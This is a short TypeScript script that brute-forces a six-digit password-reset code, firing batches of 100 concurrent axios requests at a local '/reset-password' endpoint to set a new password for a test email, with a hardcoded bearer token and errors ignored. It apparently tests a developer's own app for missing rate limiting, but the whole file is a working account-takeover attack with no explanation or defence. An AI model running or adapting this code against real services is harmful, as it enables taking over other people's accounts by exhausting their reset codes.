import axios from 'axios';

 async function sendRequest(otp:string) {
  let data = JSON.stringify({
  "email": "test@example.com",
  "otp": otp,
  "newPassword": "2323433"
 });

 let config = {
          method: 'post',
          maxBodyLength: Infinity,
          url: "http://localhost:3000/reset-password",
      headers: { 
    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2ODJhOGY4M2YyNzg2YmZiYjk3NWY5NzUiLCJpYXQiOjE3NDc2MTk3MTV9.n_N3CbU2Srh_-WyjkyauBxG2HvOjAD4pa-56G4f0Z4w', 
    'Content-Type': 'application/json'
  },
  data : data
};


try {
   await axios.request(config)
}catch(e) {
   
}


 }

 async function main() {
  for(let i =0; i<=999999; i+=100) {
     
    const  p = [];
    console.log(i);
    for(let j = 0; j<100; j++){
      p.push(sendRequest((i+j).toString()));
    }

     await Promise.all(p)
  }
 }

 main();;



 
 
